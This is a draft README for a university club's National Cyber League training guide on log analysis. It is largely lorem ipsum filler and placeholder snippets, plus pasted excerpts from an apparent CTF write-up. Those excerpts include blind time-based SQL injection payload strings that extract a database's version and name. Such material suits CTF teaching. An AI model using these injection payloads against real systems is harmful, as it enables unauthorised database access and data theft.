<p align="center">
  <img src="https://raw.githubusercontent.com/layer-zero-unlv/training-sessions/master/images/layer-zero-logo.png" width="600" height="400" />
</p>

<!-- TODO: Maybe modify the img src to local like images/layer-zero-logo.png to prevent hard-coding in the source -->

# Layer Zero NCL Training Guide - LOGS

Guide on National Cyber League's `Log Analysis (LOGS)` category.

## Lorem Ipsum

Lorem `ipsum dolor` sit amet.

## Lorem Ipsum

Lorem *ipsum* dolor **sit** amet.

```PowerShell

    $Variable = Invoke-WebRequest -Uri https://www.gieraelortega.com/

```

## How do I download this repository?

Install Git and run `git clone https://github.com/layer-zero-unlv/training-sessions.git`

or 

Use the `Clone or Download` option and select `Download ZIP`

## Additional References/Resources
1. https://layer-zero.org/
2. https://involvementcenter.unlv.edu/organization/layer_zero
3. https://github.com/layer-zero-unlv



# Temporary snippets retrieved from another CTF writeup to use as a reference for structure/writing


![Challenge 1](images/OSINT-1.png)

Something Something

`Code or snippet or website or something`

Something else:

```python
>>> bin_array_image = ['0b01111010', '0b01101100', '0b01101001', '0b01100010', '0b00101011', '0b01111000', '0b10011100', '0b01001011', '0b11001010', '0b00101100', '0b11010001', '0b01001011', '0b11001001', '0b11010111', '0b11001111', '0b00110000', '0b00101100', '0b11001001', '0b01001000', '0b00101101', '0b11001010', '0b00000101', '0b00000000', '0b00100101', '0b11010010', '0b00000101', '0b00101001']
>>> s = ''.join(chr(int(x,2)) for x in bin_array_image)
>>> print(s)
zlib+xKÊ,ÑKÉ×Ï0,ÉH-Ê %Ò)
```

```java
private void attemptLogin() throws Exception {
    ...
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("username", username);
    jSONObject.put("password", password);
    jSONObject.put("cmd", "getTemp");
    Volley.newRequestQueue(this).add(new PayloadRequest(jSONObject, new Listener<String>() {
        public void onResponse(String str) {
            if (str == null) {
                LoginActivity.this.loginSuccess();
                return;
            }
            LoginActivity.this.showProgress(false);
            LoginActivity.this.mPasswordView.setError(str);
            LoginActivity.this.mPasswordView.requestFocus();
        }
    }));
```

In `attemptLogin` the App builds a json object like this: `{"username": "", "password": "", "cmd": "getTemp"}` and then instantiates a  `PayloadRequest` object which will be added to a Volley Queue to be processed. So let's see what does this class do.


```PowerShell
$Foo = Invoke-WebRequest -Uri https://www.google.com
```

#### version()
```java
	public static String blindVersion() throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(version(),%d,1)))%c%d,SLEEP(%d),1))#";
		return PayloadRequest.blindString(injection, 25);
	}
	// 10.1.37-MariaDB
```

#### database()
```java
	public static String blindDatabase() throws Exception {
		String injection = "'||(IF((SELECT ascii(substr(database(),%d,1)))%c%d,SLEEP(%d),1))#";
		return PayloadRequest.blindString(injection, 25);
	}
	// flitebackend
```


Two tables found: `devices` and `users` in `flitebackend` database.


```CONGRATULATIONS!

If you're reading this, you've made it to the end of the road for this CTF.
```

HERE IT IS: c8889970d9fb722066f31e804e351993